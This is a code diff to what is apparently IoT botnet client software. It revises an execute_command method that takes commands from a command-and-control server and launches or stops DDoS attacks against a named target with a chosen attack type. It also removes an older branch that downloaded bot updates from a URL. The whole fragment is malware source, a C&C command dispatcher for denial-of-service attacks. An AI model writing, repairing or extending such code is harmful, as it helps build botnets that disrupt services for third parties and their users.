@@ -373,27 +373,31 @@ class IoTBot:
     def execute_command(self, command_data):
         """Execute command received from C&C server"""
         try:
-            command = command_data.get('command', '').lower()
-            target = command_data.get('target', '')
-            
-            if command == 'start_ddos':
-                attack_type = command_data.get('attack_type', 'syn')
-                duration = command_data.get('duration', 60)
-                return self.execute_ddos_attack(target, attack_type, duration)
-                
-            elif command == 'stop_ddos':
+            cmd_val = command_data.get('command', '')
+            # Handle string command (e.g., 'start_ddos <target> <attack_type>')
+            if isinstance(cmd_val, str) and cmd_val.startswith('start_ddos'):
+                parts = cmd_val.split()
+                if len(parts) >= 3:
+                    # e.g., start_ddos <target> <attack_type>
+                    _, target, attack_type = parts[:3]
+                else:
+                    self.log(f"Malformed start_ddos command: {cmd_val}")
+                    return False
+                return self.execute_ddos_attack(target, attack_type)
+            elif isinstance(cmd_val, str) and cmd_val.startswith('stop_ddos'):
                 return self.stop_attack()
-                
-            elif command == 'update':
-                # Handle bot update command
-                update_url = command_data.get('update_url')
-                if update_url:
-                    return self.update_bot(update_url)
-                    
             else:
-                self.log(f"Unknown command: {command}")
-                return False
-                
+                # Fallback to dict-based (original) handling
+                command = cmd_val.lower() if isinstance(cmd_val, str) else ''
+                target = command_data.get('target', '')
+                attack_type = command_data.get('attack_type', 'syn')
+                if command == 'start_ddos':
+                    return self.execute_ddos_attack(target, attack_type)
+                elif command == 'stop_ddos':
+                    return self.stop_attack()
+                else:
+                    self.log(f"Unknown command: {cmd_val}")
+                    return False
         except Exception as e:
             self.log(f"Error executing command: {e}")
             return False
